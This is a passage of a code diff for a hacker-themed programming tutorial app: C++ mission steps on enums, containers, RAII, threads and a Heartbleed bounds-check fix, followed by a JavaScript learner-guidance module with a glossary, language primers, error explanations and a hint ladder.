+      "Write <code>int main() {</code>. Every C++ program starts here.",
+      "Inside <code>main</code>, add <code>const std::string handle = \"neo\";</code> and <code>auto line = intro(handle, 3);</code>. <code>auto</code> lets the compiler work out the type.",
+      "Print it with <code>std::cout &lt;&lt; line &lt;&lt; '\\n';</code>, then close <code>main</code> with <code>}</code>."
+  ],
+  cpp2: [
+      "Write <code>enum class Level { Low, Medium, High, Critical };</code>. <code>enum class</code> keeps the names scoped (<code>Level::Low</code>) and stops them silently turning into ints.",
+      "Write <code>Level classify(int score) {</code> with <code>if (score &gt;= 90) return Level::Critical;</code>, then <code>else if (score &gt;= 60) return Level::High;</code>, then <code>else if (score &gt;= 30) return Level::Medium;</code>, then <code>else return Level::Low;</code>.",
+      "Write <code>const char* name(Level l) {</code> and open <code>switch (l) {</code>.",
+      "Add one case per enumerator, such as <code>case Level::Low: return \"LOW\";</code>, and do the same for MEDIUM, HIGH and CRITICAL. Covering every case lets the compiler warn you if you add a level later.",
+      "After the switch, add <code>return \"?\";</code> and close the function."
+  ],
+  cpp3: [
+      "Write <code>std::unordered_map&lt;std::string, int&gt; tally(const std::vector&lt;std::string&gt;&amp; ips) {</code>. The map pairs each IP with its count.",
+      "Inside, declare <code>std::unordered_map&lt;std::string, int&gt; counts;</code>.",
+      "Loop with <code>for (const auto&amp; ip : ips) { ++counts[ip]; }</code>. <code>counts[ip]</code> starts at 0 for a new IP, and <code>const auto&amp;</code> avoids copying each string.",
+      "Then <code>return counts;</code> and close the function.",
+      "Write a function that prints the result using structured bindings, which unpack each pair into two names: <code>for (const auto&amp; [ip, n] : tally(ips)) std::cout &lt;&lt; ip &lt;&lt; \": \" &lt;&lt; n &lt;&lt; '\\n';</code>."
+  ],
+  cpp4: [
+      "Add <code>#include &lt;sstream&gt;</code>. Write <code>std::size_t count_words(const std::string&amp; text) {</code>.",
+      "Inside, <code>std::istringstream in(text); std::string word; std::size_t n = 0; while (in &gt;&gt; word) ++n; return n;</code>. <code>&gt;&gt;</code> reads one word at a time and skips any whitespace.",
+      "Write <code>void redact(std::string&amp; msg) { msg = \"[REDACTED]\"; }</code>. The <code>&amp;</code> (a reference) means you change the caller's string, not a copy.",
+      "Write <code>std::string scan(const std::string&amp; host, int port = 443) { return host + \":\" + std::to_string(port); }</code>.",
+      "Write a lambda that captures a variable: <code>int threshold = 3; auto noisy = [threshold](std::size_t words) { return words &gt; static_cast&lt;std::size_t&gt;(threshold); };</code>. Put it inside a small function."
+  ],
+  cpp5: [
+      "Add <code>#include &lt;cctype&gt;</code> and <code>#include &lt;string_view&gt;</code>. Write <code>std::string caesar(std::string_view text, int shift) {</code>.",
+      "Create the output and reserve space up front: <code>std::string out; out.reserve(text.size());</code>. Then make the shift safe with <code>int s = ((shift % 26) + 26) % 26;</code>.",
+      "Loop with <code>for (char c : text) {</code> and convert first: <code>unsigned char u = static_cast&lt;unsigned char&gt;(c);</code>. <code>std::isalpha</code> needs an unsigned char.",
+      "If <code>std::isalpha(u)</code>, set <code>char base = std::isupper(u) ? 'A' : 'a';</code> and <code>out.push_back(static_cast&lt;char&gt;(base + (c - base + s) % 26));</code>. Otherwise <code>out.push_back(c);</code>. After the loop, <code>return out;</code>.",
+      "Write <code>bool is_private(std::string_view ip) { return ip.starts_with(\"10.\") || ip.starts_with(\"192.168.\"); }</code>."
+  ],
+  cpp6: [
+      "Write <code>class Node {</code> with a <code>public:</code> section.",
+      "Add the constructor: <code>explicit Node(std::string name, int strength = 0) : name_(std::move(name)), strength_(strength) {}</code>. The part after <code>:</code> is the member initializer list, and <code>explicit</code> stops a plain string from silently turning into a Node.",
+      "Add const accessors, which promise not to change the object: <code>int strength() const { return strength_; }</code> and <code>const std::string&amp; name() const { return name_; }</code>.",
+      "Add <code>private:</code> with <code>std::string name_;</code> and <code>int strength_;</code>, then <code>};</code>. A class needs that semicolon.",
+      "Write an RAII class, whose destructor cleans up automatically: <code>class LogFile { public: explicit LogFile(const char* path) : f_(std::fopen(path, \"a\")) {} ~LogFile() { if (f_) std::fclose(f_); }</code>.",
+      "Delete copying so two objects can never close the same file: <code>LogFile(const LogFile&amp;) = delete; LogFile&amp; operator=(const LogFile&amp;) = delete;</code>. Add <code>private: std::FILE* f_; };</code>."
+  ],
+  cpp7: [
+      "Add <code>#include &lt;memory&gt;</code>, <code>&lt;optional&gt;</code>, <code>&lt;charconv&gt;</code> and <code>&lt;vector&gt;</code>. Write <code>struct Implant { std::string id; };</code>.",
+      "Write <code>std::optional&lt;int&gt; parse_port(std::string_view s) {</code>. <code>std::optional</code> either holds an int or holds nothing.",
+      "Parse with <code>int value = 0; auto [ptr, ec] = std::from_chars(s.data(), s.data() + s.size(), value);</code>.",
+      "Reject bad input: <code>if (ec != std::errc{} || ptr != s.data() + s.size() || value &lt; 1 || value &gt; 65535) return std::nullopt;</code>. The <code>ptr</code> check catches trailing junk like <code>\"80abc\"</code>. Then <code>return value;</code>.",
+      "Create an owned object with no raw <code>new</code>: <code>std::unique_ptr&lt;Implant&gt; p = std::make_unique&lt;Implant&gt;(Implant{\"x-17\"});</code>.",
+      "Move it into a vector: <code>std::vector&lt;std::unique_ptr&lt;Implant&gt;&gt; found; found.push_back(std::move(p));</code>. A <code>unique_ptr</code> can't be copied, only moved."
+  ],
+  cpp8: [
+      "Add <code>#include &lt;span&gt;</code>, <code>&lt;cstddef&gt;</code>, <code>&lt;optional&gt;</code> and <code>&lt;vector&gt;</code>.",
+      "Write <code>std::optional&lt;std::vector&lt;std::byte&gt;&gt; heartbeat_reply(std::span&lt;const std::byte&gt; payload, std::size_t claimed) {</code>. A <code>span</code> is a view of bytes that knows its own size.",
+      "This is the Heartbleed fix. Before touching any bytes, check <code>if (claimed &gt; payload.size()) return std::nullopt;</code>.",
+      "Take only the claimed bytes: <code>auto echo = payload.first(claimed);</code>.",
+      "Return a copy of them: <code>return std::vector&lt;std::byte&gt;(echo.begin(), echo.end());</code>. Don't use <code>memcpy</code>."
+  ],
+  cpp9: [
+      "Add <code>#include &lt;concepts&gt;</code>, <code>&lt;algorithm&gt;</code> and <code>&lt;vector&gt;</code>.",
+      "Write <code>template &lt;std::totally_ordered T&gt;</code> and on the next line <code>T strongest(const std::vector&lt;T&gt;&amp; xs) { return *std::max_element(xs.begin(), xs.end()); }</code>. The concept means it only accepts types you can compare with <code>&lt;</code>.",
+      "Write a class template: <code>template &lt;typename T&gt; class Box { public: explicit Box(T v) : value_(v) {} const T&amp; get() const { return value_; } private: T value_; };</code>.",
+      "Write a constexpr function, which the compiler can run at compile time: <code>constexpr int xp_for(int rank) { return 50 + 15 * rank; }</code>.",
+      "Check it at compile time: <code>static_assert(xp_for(2) == 80);</code>. If it's wrong, the program won't even compile."
+  ],
+  cpp10: [
+      "Add <code>#include &lt;algorithm&gt;</code>, <code>&lt;numeric&gt;</code>, <code>&lt;ranges&gt;</code> and <code>&lt;functional&gt;</code>. Keep the starter's <code>struct Hit { std::string ip; int count; };</code>.",
+      "Write <code>int analyze(std::vector&lt;Hit&gt;&amp; hits) {</code> and sort by count, biggest first: <code>std::ranges::sort(hits, std::greater{}, &amp;Hit::count);</code>. <code>&amp;Hit::count</code> is a projection that says what to sort by.",
+      "Find the first internal IP: <code>auto it = std::find_if(hits.begin(), hits.end(), [](const Hit&amp; h) { return h.ip.starts_with(\"10.\"); });</code>.",
+      "Add up the counts: <code>int total = std::accumulate(hits.begin(), hits.end(), 0, [](int acc, const Hit&amp; h) { return acc + h.count; });</code>.",
+      "Use a views pipeline: <code>for (const auto&amp; h : hits | std::views::filter([](const Hit&amp; h) { return h.count &gt; 20; })) { ... }</code>. Then <code>return total;</code>."
+  ],
+  cpp11: [
+      "Add <code>#include &lt;thread&gt;</code>, <code>&lt;atomic&gt;</code>, <code>&lt;mutex&gt;</code> and <code>&lt;vector&gt;</code>. Write <code>bool ping(const std::string&amp;) { return true; }</code>.",
+      "Write <code>int sweep(const std::vector&lt;std::string&gt;&amp; hosts) {</code> with <code>std::atomic&lt;int&gt; up{0};</code>, <code>std::mutex log_mutex;</code> and <code>std::vector&lt;std::thread&gt; workers;</code>.",
+      "For each host, start a thread: <code>workers.emplace_back([&amp;up, &amp;log_mutex, &amp;h] { ... });</code>, using <code>for (const auto&amp; h : hosts)</code>.",
+      "Inside the thread: <code>if (ping(h)) { ++up; std::lock_guard&lt;std::mutex&gt; lock(log_mutex); std::cout &lt;&lt; h &lt;&lt; \" up\\n\"; }</code>. The lock stops two threads printing at the same time.",
+      "Wait for every thread with <code>for (auto&amp; t : workers) t.join();</code>, then <code>return up.load();</code>."
+  ],
+  cpp12: [
+      "Add <code>#include &lt;memory&gt;</code>, <code>&lt;stdexcept&gt;</code>, <code>&lt;utility&gt;</code> and <code>&lt;gtest/gtest.h&gt;</code>.",
+      "Write <code>class Buffer { public: explicit Buffer(std::size_t n) : data_(std::make_unique&lt;int[]&gt;(n)), size_(n) {}</code>.",
+      "Delete copying: <code>Buffer(const Buffer&amp;) = delete; Buffer&amp; operator=(const Buffer&amp;) = delete;</code>.",
+      "Add the moves: <code>Buffer(Buffer&amp;&amp; other) noexcept : data_(std::move(other.data_)), size_(std::exchange(other.size_, 0)) {}</code>, plus a move assignment that does the same and ends with <code>return *this;</code>. <code>std::exchange</code> leaves the source empty.",
+      "Add <code>int&amp; at(std::size_t i) { if (i &gt;= size_) throw std::out_of_range(\"Buffer::at\"); return data_[i]; }</code> and <code>std::size_t size() const { return size_; }</code>, then the private members <code>std::unique_ptr&lt;int[]&gt; data_; std::size_t size_;</code>.",
+      "Write a test: <code>TEST(BufferTest, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_range); }</code>."
+  ],
+  });
+})(typeof window !== "undefined" ? window : globalThis);
+
+"""##,
+    // web/curriculum/_guide.js
+    ##"""
+// ROOT//ACCESS learner guidance. Shared by the web app and the Swift app (through tools/swift-bridge.js).
+//   RA.stepsFor(m)          numbered steps (mission.steps or RA.STEPS[id])
+//   RA.requirements(m,code) live structure checklist
+//   RA.ORIENT[lang]         "first time in this language" primer shown on rank 1
+//   RA.keyTerms(m)          glossary entries that appear in the lesson/task
+//   RA.explain(m, result)   plain-English meaning of a failing checkpoint
+//   RA.parsons(m, sol)      the reference solution's lines, shuffled (hint tier 2)
+//   RA.hint(m, code, report, tier)  the hint ladder: 1 nudge -> 2 shuffled lines -> 3 full answer
+(function (g) {
+  const RA = g.RA = g.RA || {};
+  const strip = (h) => String(h || "").replace(/<[^>]+>/g, " ").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&amp;/g, "&").replace(/\s+/g, " ").trim();
+  const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  RA.stepsFor = (m) => (m && (m.steps || (RA.STEPS && RA.STEPS[m.id]))) || [];
+  RA.requirements = (m, code) => (m.checks || []).map((c) => { c.re.lastIndex = 0; return { ok: c.re.test(code || ""), hint: c.hint }; });
+
+  // ---------------- glossary ----------------
+  RA.GLOSSARY = {
+    "program": "A list of instructions the computer runs from top to bottom.",
+    "variable": "A name that holds a value, like a labelled box. You create one with =.",
+    "value": "A piece of data, such as the number 3 or the text \"neo\".",
+    "string": "Text. It is written inside quote marks, as in \"hello\".",
+    "integer": "A whole number with no decimal point, like 7 or -2.",
+    "boolean": "A value that is either true or false.",
+    "type": "The kind of value something is: text, number, true/false, list, and so on.",
+    "function": "A named, reusable block of code. You define it once and call it as many times as you like.",
+    "parameter": "A variable in a function's definition that receives whatever you pass in.",
+    "argument": "The actual value you pass into a function when you call it.",
+    "return": "Sends a value back from a function to the code that called it, and ends the function.",
+    "call": "To run a function by writing its name followed by brackets, such as greet(\"neo\").",
+    "condition": "Something that is either true or false, like score >= 90. It decides which code runs.",
+    "if": "Runs a block of code only when a condition is true.",
+    "loop": "Code that repeats, once per item or until a condition changes.",
+    "for loop": "A loop that runs once for each item in a list or range.",
+    "range": "A sequence of numbers. range(1, 6) gives 1 to 5, because the end isn't included.",
+    "list": "An ordered collection of values in square brackets. The first position is 0.",
+    "array": "An ordered collection of values. Most languages count positions from 0.",
+    "index": "A position in a list. Counting starts at 0, so [0] is the first item.",
+    "dictionary": "A collection that maps keys to values, like a phone book from name to number.",
+    "map": "A collection that maps keys to values. Also the name of the operation that transforms every item in a list.",
+    "set": "A collection with no duplicates and no fixed order.",
+    "tuple": "A small fixed group of values bundled together, like (2, 1).",
+    "indentation": "Spaces at the start of a line. Python uses them to decide which lines belong inside an if, loop or function.",
+    "comment": "A note for humans that the computer ignores. It starts with # or //.",
+    "syntax": "The grammar of a language: where colons, brackets and quotes go.",
+    "error": "A message telling you what went wrong and on which line. Read it, because it is a clue.",
+    "exception": "An error raised while a program runs, which can be caught and handled.",
+    "compile": "To translate source code into a program the computer can run. Compiled languages check your code before it runs.",
+    "class": "A blueprint for objects. It bundles data (fields) with behaviour (methods).",
+    "object": "One thing made from a class, with its own data.",
+    "method": "A function that belongs to an object or class, called with a dot: name.upper().",
+    "field": "A variable stored inside an object.",
+    "property": "A named value on an object. Some properties are computed every time you read them.",
+    "struct": "A type that groups related fields together. In Swift, structs are copied when assigned.",
+    "enum": "A type with a fixed set of named options, like LOW, MEDIUM and HIGH.",
+    "interface": "A list of methods a type promises to provide, without saying how.",
+    "protocol": "Swift's word for an interface: a set of requirements a type promises to meet.",
+    "trait": "Rust's word for an interface: shared behaviour that types can implement.",
+    "generic": "Code written once that works for many types, written with a placeholder like T.",
+    "closure": "A function that remembers the variables around where it was created.",
+    "lambda": "A short function with no name, often passed straight into another function.",
+    "callback": "A function you hand to other code so it can call it later.",
+    "async": "Code that can pause while it waits for something, such as the network, without freezing everything else.",
+    "await": "Pauses the current async function until a result is ready.",
+    "thread": "A separate line of execution, so the program can do several things at once.",
+    "concurrency": "Doing several tasks at overlapping times, such as checking 500 servers at once.",
+    "mutex": "A lock that lets only one thread touch shared data at a time.",
+    "optional": "A value that may be missing. You have to check it before you use it.",
+    "null": "A special value meaning \"nothing here\". It is also called nil or None.",
+    "pointer": "A value that holds the memory address of another value.",
+    "reference": "Another name for an existing value, so changes through it affect the original.",
+    "test": "Code that runs your code and checks the answer automatically.",
+    "assert": "A line in a test that fails loudly if something isn't what you expected.",
+    "regex": "A regular expression, a mini language for matching patterns in text.",
+    "query": "A question you ask a database, written in SQL.",
+    "table": "Rows and columns of data in a database, like a spreadsheet.",
+    "pipe": "In the shell, | sends one command's output into the next command.",
+    "immutable": "Can't be changed after it is created.",
+    "recursion": "A function that calls itself on a smaller piece of the problem."
+  };
+  const COMMON = { list: 1, type: 1, call: 1, value: 1, return: 1, table: 1, pipe: 1, class: 1, object: 1, test: 1, loop: 1, program: 0, map: 1, set: 1, key: 1, index: 1, block: 1, error: 1 };
+  const termRe = {};
+  Object.keys(RA.GLOSSARY).forEach((t) => { termRe[t] = new RegExp("\\b" + t.replace(/ /g, "\\s+") + "(e?s)?\\b", "i"); });
+  RA.keyTerms = (m, max) => {
+    const text = strip([m.concept, m.lesson, m.task].join(" "));
+    // Everyday words only count when the mission actually teaches them (in the concept, bold or code).
+    const marked = strip([m.concept].concat(((m.lesson || "") + (m.task || "")).match(/<(b|strong|code)>[\s\S]*?<\/\1>/g) || []).join(" | "));
+    const hits = [];
+    Object.keys(RA.GLOSSARY).forEach((t) => {
+      const x = text.search(termRe[t]);
+      if (x >= 0 && (!COMMON[t] || termRe[t].test(marked))) hits.push([x, t]);
+    });
+    hits.sort((a, b) => a[0] - b[0]);
+    return hits.slice(0, max || 8).map(([, t]) => ({ term: t, def: RA.GLOSSARY[t] }));
+  };
+
+  // ---------------- first-time orientation per language ----------------
+  const O = (run, file, out, comment, gotchas) => ({ run, file, out, comment, gotchas });
+  RA.ORIENT = {
+    basics: O("Python reads your file from top to bottom and runs each line. No compile step is needed.",
+      "Everything goes in one file. Some missions use functions (def) and some are plain lines of code.",
+      "<code>print(\"text\")</code> shows text on the screen.",
+      "<code># like this</code>",
+      ["Indentation (4 spaces) is part of the grammar.", "Text needs quotes, but numbers and variable names don't.", "<code>=</code> stores a value and <code>==</code> compares two values."]),
+    python: O("Python runs your file top to bottom. The checkpoints then call your functions with test inputs.",
+      "Write <code>def</code> functions with exactly the names in the task. Extra helper functions are fine.",
+      "<code>print(x)</code>. Functions should usually <code>return</code> rather than print.",
+      "<code># like this</code>",
+      ["Blocks are indented 4 spaces and the line before ends with <code>:</code>.", "A function without <code>return</code> gives back <code>None</code>.", "<code>pass</code> in a starter means \"do nothing\", so replace it."]),
+    javascript: O("JavaScript runs your file, then the checkpoints call your functions. No compile step is needed.",
+      "Write <code>function name(...) { }</code> with the names from the task.",
+      "<code>console.log(x)</code>",
+      "<code>// like this</code>",
+      ["Use <code>===</code> to compare, not <code>==</code>.", "Use <code>const</code> by default and <code>let</code> when a value changes.", "Strings with <code>${...}</code> inside need backticks <code>`</code>."]),
+    typescript: O("TypeScript is JavaScript with types. It is compiled with strict checks, then run on Node.",
+      "Write functions and types with the exact names in the task, and add type annotations like <code>(x: number): string</code>.",
+      "<code>console.log(x)</code>",
+      "<code>// like this</code>",
+      ["Type errors stop the build, so read the first one.", "<code>name: Type</code> goes after the name.", "<code>undefined</code> and <code>null</code> must be handled when a type allows them."]),
+    sql: O("Your SQL runs against a small training database (agents, events, nodes). The checkpoint compares your result rows with the expected rows.",
+      "Write one statement, or several separated by <code>;</code>.",
+      "A <code>SELECT</code> statement's result is your output.",
+      "<code>-- like this</code>",
+      ["Text values go in single quotes: <code>'failed'</code>.", "Column order and row order matter, so use <code>ORDER BY</code> when the task asks.", "Clause order is SELECT, FROM, WHERE, GROUP BY, HAVING, ORDER BY, LIMIT."]),
+    bash: O("Your script runs in a fresh temporary folder with test files already created. The checkpoints look at what it prints and the files it leaves behind.",
+      "Write commands one per line, top to bottom, as you would type them in a terminal.",
+      "<code>echo \"text\"</code>",
+      "<code># like this</code>",
+      ["Don't put spaces around <code>=</code>: write <code>NAME=value</code>.", "Wrap variables in double quotes: <code>\"$file\"</code>.", "<code>$1</code> is the first argument passed to the script."]),
+    go: O("Go is compiled. If the build fails, nothing runs, so fix the first compiler error first.",
+      "<code>package main</code> and imports go at the top. Then write your functions (and <code>func main()</code> if asked).",
+      "<code>fmt.Println(x)</code> (needs <code>import \"fmt\"</code>)",
+      "<code>// like this</code>",
+      ["An unused variable or import is a compile error.", "<code>:=</code> declares a new variable and <code>=</code> assigns to an existing one.", "Opening braces go on the same line as <code>func</code>/<code>if</code>/<code>for</code>."]),
+    rust: O("Rust is compiled with strict safety checks. Compiler errors explain the fix. Read the <code>help:</code> line.",
+      "Write <code>fn</code> functions with the names in the task. <code>fn main()</code> is the entry point when asked for.",
+      "<code>println!(\"{}\", x)</code>",
+      "<code>// like this</code>",
+      ["Variables can't be changed unless declared with <code>let mut</code>.", "The last expression in a function, with no <code>;</code>, is returned.", "<code>&amp;str</code> is borrowed text and <code>String</code> is owned text."]),
+    swift: O("Swift is compiled. Checkpoints run on a real Swift compiler and call your functions.",
+      "Write <code>func</code> declarations with the exact names and labels from the task.",
+      "<code>print(x)</code>",
+      "<code>// like this</code>",
+      ["<code>let</code> can't change and <code>var</code> can.", "Argument labels are part of the name: <code>intro(handle:level:)</code>.", "Optionals (<code>String?</code>) must be unwrapped. Avoid <code>!</code>."]),
+    kotlin: O("Kotlin is compiled for the JVM. Checkpoints call your functions directly.",
+      "Write top-level <code>fun</code> declarations. Add <code>fun main()</code> when the task asks for it.",
+      "<code>println(x)</code>",
+      "<code>// like this</code>",
+      ["<code>val</code> can't change and <code>var</code> can.", "Types come after names: <code>score: Int</code>.", "<code>String?</code> may be null, so use <code>?:</code> for a fallback."]),
+    java: O("Java is compiled. Every method lives inside a class, so keep the class from the starter.",
+      "Put your methods inside the starter's class braces. Use <code>static</code> methods unless the task says otherwise.",
+      "<code>System.out.println(x)</code>",
+      "<code>// like this</code>",
+      ["Every statement ends with <code>;</code>.", "Compare strings with <code>.equals()</code>, not <code>==</code>.", "Types come before names: <code>int score</code>."]),
+    csharp: O("C# is compiled on .NET. This file uses top-level statements, so you can write code with no class around it.",
+      "Write <code>static</code> methods at the top level, plus any classes or records the task asks for.",
+      "<code>Console.WriteLine(x)</code>",
+      "<code>// like this</code>",
+      ["Every statement ends with <code>;</code>.", "Method names use PascalCase: <code>ThreatLevel</code>.", "Interpolated strings start with <code>$</code>: <code>$\"{x}\"</code>."]),
+    cpp: O("C++ is compiled with g++ (C++23). One compiler error can cause many more, so fix the first one.",
+      "Keep the <code>#include</code> lines and write functions with the names in the task. Add <code>int main()</code> when asked.",
+      "<code>std::cout &lt;&lt; x &lt;&lt; '\\n';</code>",
+      "<code>// like this</code>",
+      ["Every statement ends with <code>;</code>, and so does every class or struct, after its <code>}</code>.", "Standard library names start with <code>std::</code>.", "Pass big values by <code>const&amp;</code> to avoid copies."])
+  };
+  RA.orientHTML = (L) => {
+    const o = RA.ORIENT[L]; if (!o) return "";
+    return `<ul class="orient"><li><b>How it runs:</b> ${o.run}</li><li><b>What to write:</b> ${o.file}</li><li><b>Printing:</b> ${o.out}</li><li><b>Comments:</b> ${o.comment}</li><li><b>Common gotchas:</b><ul>${o.gotchas.map((x) => `<li>${x}</li>`).join("")}</ul></li></ul>`;
+  };
+
+  // ---------------- plain-English failure explanations ----------------
+  const ERR = [
+    [/IndentationError|unexpected indent|expected an indented block|unindent does not match/i, "Python is confused by the spaces at the start of a line. Lines inside an if, for or def must be indented the same amount (4 spaces), and the line before them must end with a colon."],
+    [/SyntaxError.*expected ':'|expected ':'/i, "A line that starts a block (if, else, for, def, while) is missing the colon : at the end."],
+    [/unterminated string|EOL while scanning|unterminated string literal/i, "A piece of text is missing its closing quote mark."],
+    [/SyntaxError|invalid syntax/i, "The code isn't written in a shape the language understands. Check the line named in the error and the one above it for a missing bracket, quote, colon or comma."],
+    [/NameError: name '(\w+)' is not defined/i, (m) => `You used the name <code>${esc(m[1])}</code>, but nothing with that name exists yet. Check the spelling, and make sure it is created (or the function is defined) with exactly that name.`],
+    [/ReferenceError: (\w+) is not defined/i, (m) => `<code>${esc(m[1])}</code> doesn't exist. Check that your function or variable has exactly that name, including capital letters.`],
+    [/TypeError:.*NoneType/i, "Something was None, meaning nothing. Usually a function didn't return a value. Check that every path through it ends with a return."],
+    [/TypeError: can only concatenate str|must be str, not int|unsupported operand type/i, "You tried to join text with a number. Turn the number into text first with str(n), or use an f-string."],
+    [/TypeError: (\w+)\(\) (missing|takes)/i, (m) => `<code>${esc(m[1])}</code> was called with a different number of inputs than it accepts. Match the parameters in the task exactly.`],
+    [/is not a function/i, "Something was called like a function but isn't one. Check the function's name and that you defined it with function or =>."],
+    [/IndexError|index out of range|ArrayIndexOutOfBounds|out_of_range/i, "The code asked for a position past the end of a list. Remember that positions start at 0, so the last item is at length − 1."],
+    [/KeyError: (.+)/i, (m) => `The dictionary has no key ${esc(m[1])}. Check for the key first, or use .get() with a default.`],
+    [/ZeroDivisionError|divide by zero/i, "The code divided by zero. Handle the empty or zero case first."],
+    [/RecursionError|StackOverflow|stack overflow/i, "A function kept calling itself forever. Make sure there is a case that stops."],
+    [/AttributeError: '(\w+)' object has no attribute '(\w+)'/i, (m) => `A ${esc(m[1])} doesn't have <code>${esc(m[2])}</code>. Check the spelling, or whether the value is the type you expected.`],
+    [/undefined: (\w+)/i, (m) => `Go can't find <code>${esc(m[1])}</code>. Define it with exactly that name, or import the package it comes from.`],
+    [/declared and not used|imported and not used/i, "Go refuses to compile unused variables or imports. Use them or delete them."],
+    [/E0425|cannot find (value|function) `?(\w+)`?/i, (m) => `Rust can't find <code>${esc(m[2] || "that name")}</code>. Check the spelling and that it is defined in this file.`],
+    [/E0308|mismatched types/i, "The value's type doesn't match what was declared, for example returning a String where &str was expected. Read the compiler's expected/found lines."],
+    [/E0384|cannot assign twice to immutable/i, "Rust variables can't be changed by default. Declare it with let mut."],
+    [/E0382|borrow of moved value|use of moved value/i, "The value was moved somewhere else and can't be used again. Borrow it with & or clone it."],
+    [/cannot find '(\w+)' in scope/i, (m) => `Swift can't find <code>${esc(m[1])}</code>. Check the spelling and that it is declared with that exact name.`],
+    [/Unresolved reference:? '?(\w+)'?/i, (m) => `Kotlin can't find <code>${esc(m[1])}</code>. Check the spelling and imports.`],
+    [/cannot find symbol/i, "Java can't find a name you used. Check the spelling and capitals, and that it is declared or imported."],
+    [/error CS0103: The name '(\w+)'/i, (m) => `C# can't find <code>${esc(m[1])}</code>. Check the spelling (C# method names usually start with a capital letter).`],
+    [/error CS1002|; expected|expected ';'/i, "A statement is missing its semicolon ; at the end."],
+    [/was not declared in this scope|use of undeclared identifier/i, "C++ can't find a name you used. Check the spelling, add std:: for library names, or add the right #include."],
+    [/no matching function for call/i, "A function was called with the wrong argument types or number of arguments. Compare with its declaration."],
+    [/Time Limit Exceeded|timed out/i, "The program ran too long, which almost always means a loop that never ends. Check that the loop's condition eventually becomes false."],
+    [/command not found/i, "The shell couldn't find that command. Check the spelling, or whether you meant a variable ($NAME)."]
+  ];
+  const parseGotWant = (d) => { const x = String(d || "").match(/got (.*), want (.*)$/s); return x ? { got: x[1].trim(), want: x[2].trim() } : null; };
+  RA.explain = (m, r) => {
+    if (!r || r.status !== "FAIL") return "";
+    const d = String(r.detail || "");
+    if (d === "not reached") return "This check never ran, because the program stopped earlier, usually at an error above. Fix the first failing checkpoint, then run again.";
+    for (const [re, msg] of ERR) { const x = d.match(re); if (x) return typeof msg === "function" ? msg(x) : msg; }
+    const gw = parseGotWant(d);
+    if (gw) {
+      const { got, want } = gw;
+      let s = `Your code produced <code>${esc(got.slice(0, 120))}</code>, but the checkpoint expected <code>${esc(want.slice(0, 120))}</code>.`;
+      if (/^(None|undefined|null|nil)$/.test(got)) s += " Getting nothing back usually means the function doesn't return a value. Use return instead of print, and remove any leftover pass.";
+      else if (got.replace(/\s+/g, "") === want.replace(/\s+/g, "")) s += " The only difference is spacing, so check spaces and line breaks.";
+      else if (got.toLowerCase() === want.toLowerCase()) s += " The only difference is capital letters.";
+      else if (got.replace(/['"]/g, "") === want.replace(/['"]/g, "")) s += " One is text and the other is a number (look at the quotes). Convert with int(...) or str(...).";
+      else if (/^\[.*\]$/.test(got) && /^\[.*\]$/.test(want) && got.length !== want.length) s += " The lists have different contents. Check that you include every matching item and nothing extra.";
+      return s;
+    }
+    if (r.label === "Compiles") return "The compiler rejected the code, so none of the checkpoints could run. Fix the first error shown. Later errors are often side effects of it.";
+    if (r.label === "Your code runs") return "Your program crashed while it was loading, before any checks ran. The message above names the problem and the line.";
+    if (r.label === "Runs to completion") return "The program crashed or was stopped partway through. Read the message for the first error.";
+    return "This checkpoint ran your code and the result wasn't what it expected. Re-read the task's example, then compare it with what your code does for that input.";
+  };
+
+  // ---------------- Parsons lines (hint tier 2) ----------------
+  const hash = (s) => { let h = 2166136261; for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; };
+  RA.parsonsLines = (m, sol) => {
+    sol = String(sol || "").replace(/\r/g, "");
+    let lines = sol.split("\n").filter((l) => l.trim() && !/^\s*(#|\/\/|--)(?!!)/.test(l) && !/^\s*#include/.test(l));
+    if (lines.length < 2 || (m.lang === "sql" && lines.length < 3)) {
+      // One-liners (SQL, short Python): split before clause keywords and after semicolons.
+      lines = [];
+      sol.replace(/\s+/g, " ").trim().replace(/;\s*/g, ";\n").split("\n").forEach((stmt) =>
+        stmt.split(/(?=\b(?:FROM|WHERE|GROUP BY|HAVING|ORDER BY|LIMIT|LEFT JOIN|JOIN|SELECT|UPDATE|INSERT|DELETE|COMMIT|CREATE|WITH)\b)/)
+          .forEach((x) => { if (x.trim()) lines.push(x.trim()); }));
+    }
+    if (lines.length < 2 && lines[0]) {
+      // A single line: arrange its pieces instead (quoted text stays whole).
+      lines = lines[0].trim().split(/(\b[fbr]?"[^"]*"|\b[fbr]?'[^']*'|"[^"]*"|'[^']*'|\s+|[()|,;])/).filter((x) => x && x.trim());
+      lines.pieces = true;
+    }
+    return lines;
+  };
+  // Rebuild a one-line answer from its pieces with natural spacing: print("x"), range(1, 6).
+  RA.joinPieces = (parts) => parts.reduce((acc, p, i) => {
+    if (!i) return p;
+    const prev = parts[i - 1], tight = /[(\[]$/.test(prev) || /^[),:;\]]/.test(p) || (p === "(" && /[\w>\]]$/.test(prev));
+    return acc + (tight ? "" : " ") + p;
+  }, "");
+  RA.parsons = (m, sol) => {
+    const lines = RA.parsonsLines(m, sol);
+    const order = lines.map((_, i) => i);
+    let seed = hash(m.id);
+    for (let i = order.length - 1; i > 0; i--) { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; const j = seed % (i + 1); [order[i], order[j]] = [order[j], order[i]]; }
+    if (order.length > 1 && order.every((v, i) => v === i)) order.push(order.shift());
+    return { lines, shuffled: order.map((i) => lines[i]), order, pieces: !!lines.pieces };
+  };
+
+  // ---------------- the hint ladder ----------------
+  const words = (s) => strip(s).toLowerCase().match(/[a-z_][a-z0-9_]{2,}/g) || [];
+  const relatedStep = (steps, hint) => {
+    const hw = new Set(words(hint)); let best = -1, score = 0;
+    steps.forEach((s, i) => { const n = words(s).filter((w) => hw.has(w)).length; if (n > score) { score = n; best = i; } });
+    return best;
+  };
+  RA.hint = (m, code, report, tier, sol) => {
+    tier = Math.max(1, Math.min(3, tier || 1));
+    const steps = RA.stepsFor(m);
+    if (tier === 3) return { tier, title: "Full answer", kind: "solution", code: sol || "", html: "This is the reference solution for this exact mission. Read it line by line, then retype it yourself rather than pasting. Typing it is how it sticks." };
+    if (tier === 2) {
+      const p = RA.parsons(m, sol);
